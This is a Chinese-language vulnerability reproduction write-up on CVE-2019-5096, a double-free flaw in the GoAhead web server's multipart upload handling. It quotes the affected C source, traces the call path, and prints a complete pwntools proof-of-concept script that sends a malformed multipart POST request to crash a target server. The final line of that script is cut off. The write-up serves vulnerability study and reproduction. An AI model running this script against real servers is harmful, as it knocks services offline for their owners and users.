<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-5096） 远程代码溢出漏洞</h1><h2>一、漏洞简介</h2><p>GoAhead Web服务器最近被曝光在版本v5.0.1，v.4.1.1和v3.6.5中存在一个可利用的代码执行漏洞，漏洞存在http请求的multi-part/form-data字段处理中，若是发送畸形的HTTP请求，可导致GoAhead Web服务器在处理此请求期间触发double-free漏洞。 该畸形请求可以未经身份验证的GET或POST请求形式发送，并且请求的服务器上不需要存在web页面。</p><h2>二、漏洞影响</h2><p>v5.0.1，v.4.1.1和v3.6.5</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>漏洞曝光者给出了触发漏洞的源码：</p><p>/ src/upload.c /<br />66 static void freeUploadFile(WebsUpload *up)<br />67 {<br />68 if (up) {<br />69 if (up-&gt;filename) { // BUG: First UAF here<br />70 unlink(up-&gt;filename); // BUG: UAF/unlink - probably not a good idea<br />71 wfree(up-&gt;filename); // BUG: Double free here<br />72 }<br />73<br />74 wfree(up-&gt;clientFilename);<br />75 wfree(up-&gt;contentType);<br />76 wfree(up);<br />77 }<br />78 }</p><p>经过笔者的分析发现，freeUploadFile（）函数会在/src/upload.c的websFreeUpload（）函数中调用，而websFreeUpload（）函数会在/src/http.c中调用，/src/http.c中termWebs（）函数会调用websFreeUpload（）函数，/src/http.c中reuseConn（）函数会调用termWebs（）函数，从中可以看出漏洞触发函数freeUploadFile（）的调用过程。</p><p>在函数freeUploadFile（）的调用过程中，查看源码可发现有两行如下代码：</p><p>/ src/upload.c /<br />255 freeUploadFile(wp-&gt;currentFile);<br />256 file = wp-&gt;currentFile = walloc(sizeof(WebsUpload));</p><p>在此处变量 wp-&gt;currentFile会被free一次，但是被free的变量wp-&gt;currentFile在代码：</p><p>/ src/upload.c /<br />371 hashEnter(wp-&gt;files, wp-&gt;uploadVar, valueSymbol(file), 0);<br />372 defineUploadVars(wp);</p><p>在此处代码中把变量wp-&gt;currentFile加入了一个数组中，该数组中的变量在接下来的代码中会被free一次，free代码如下：</p><p>/ src/upload.c /<br />86 for (s = hashFirst(wp-&gt;files); s; s = hashNext(wp-&gt;files, s)) {<br />87 up = s-&gt;content.value.symbol;<br />88 freeUploadFile(up);</p><p>变量wp-&gt;currentFile再次被free之后，导致了double-free漏洞触发，是fastbin double free，利用方法和思路已经很成熟。</p><h3>poc</h3><p><a href="https://github.com/ianxtianxt/CVE-2019-5096-GoAhead-Web-Server-Dos-Exploit">https://github.com/ianxtianxt/CVE-2019-5096-GoAhead-Web-Server-Dos-Exploit</a></p><p>from pwn import *<br />import time<br />import sys<br />r = remote(sys.argv[1],8080)<br />rn = b"\r\n"<br /><br />payload=b''<br />payload +=b"--siiit"+rn<br />payload +=b"Content-Disposition: form-data; name=\"shit1\"; filename=\"shit.file\";"+rn<br />payload+= rn<br />payload+=b"HelloWorld!"+rn<br />payload +=b"--siiit"+rn<br />payload +=b"Content-Disposition: form-data;  name=\"shit2\"; filename=\"shit2.file\""+rn<br />payload+= rn<br />payload+=b"FuckkWorld!"+rn<br />payload +=b"--siiit"+rn<br /><br />data = b"POST / HTTP/1.1\r\nHost:HelloWorld:8080\r\n"<br />data +=b"content-type:multipart/form-data"+rn<br />data +=b"content-type:boundary=siiit"+rn<br />data +=b"content-length:"+str(len(payload)).encode()+rn<br />data +=b&quot;cookie:&quot;+b'a'*0x1+rn<br />data +=rn<br />data +=payload<br /><br /><br />r.send(data)<br />sleep(20)<br />try:<br />    dat=r.recvn(1024)<br />    print(dat)<br />    r.close()<br />except:<br />    r.close(</p></body></html>